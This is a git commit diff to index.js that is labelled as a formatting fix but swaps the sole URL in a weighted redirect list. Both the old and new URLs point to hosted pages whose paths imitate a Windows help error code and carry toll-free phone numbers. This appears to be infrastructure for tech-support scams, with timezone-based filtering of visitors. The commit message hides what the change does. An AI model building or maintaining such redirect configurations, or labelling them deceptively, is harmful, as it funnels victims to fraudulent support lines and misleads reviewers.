44c7c5905eb3e206d1ff56568a495c822ffe6cde
paalakash <palaksh452@gmail.com>
2026-06-23 18:16:38 +0530

    Fix formatting issues in index.js

--- index.js
+++ index.js
@@ -51,7 +51,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://jellyfish-app-z75ll.ondigitalocean.app/Wi0nHelpSh0errc0de030/index.html?Anph=1800-320-629", weight: 1.0 }
+    { url: "https://tejjepayy11.on-forge.com/Wi0nHelpSh0errc0de030/index.html?Anph=1-855-574-4228", weight: 1.0 }
     
 ];
 
